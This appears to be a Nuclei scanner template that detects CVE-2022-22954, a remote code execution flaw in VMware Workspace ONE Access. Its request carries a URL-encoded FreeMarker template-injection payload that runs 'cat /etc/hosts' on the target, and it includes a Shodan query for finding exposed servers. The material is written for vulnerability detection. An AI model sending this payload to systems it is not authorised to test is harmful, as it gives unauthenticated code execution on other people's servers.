id: CVE-2022-22954
info:
  name: VMware Workspace ONE Access - Server-Side Template Injection
  author: sherlocksecurity
  severity: critical
  description: A vulnerability in VMware Workspace ONE Access could allow unauthenticated
    attackers to execute remote code via a server-side template injection flaw.
  reference:
  - https://www.tenable.com/blog/vmware-patches-multiple-vulnerabilities-in-workspace-one-vmsa-2022-0011
  - https://www.vmware.com/security/advisories/VMSA-2022-0011.html
  - http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22954
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-22954
    cwe-id: CWE-94
  metadata:
    shodan-query: http.favicon.hash:-1250474341
    impact: The CVE-2022-22954 vulnerability in VMware Workspace ONE Access could
      have a devastating impact as an attacker could remotely execute code, potentially
      compromising sensitive data and systems.
    recommendation: It is recommended that administrators patch the affected systems
      immediately to prevent exploitation of the remote code execution vulnerability
      in VMware Workspace ONE Access.
  tags: workspaceone,kev,tenable,packetstorm,cve,cve2022,vmware,ssti
requests:
- method: GET
  path:
  - '{{BaseURL}}/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Authorization context is not valid
  - type: status
    status:
    - 400
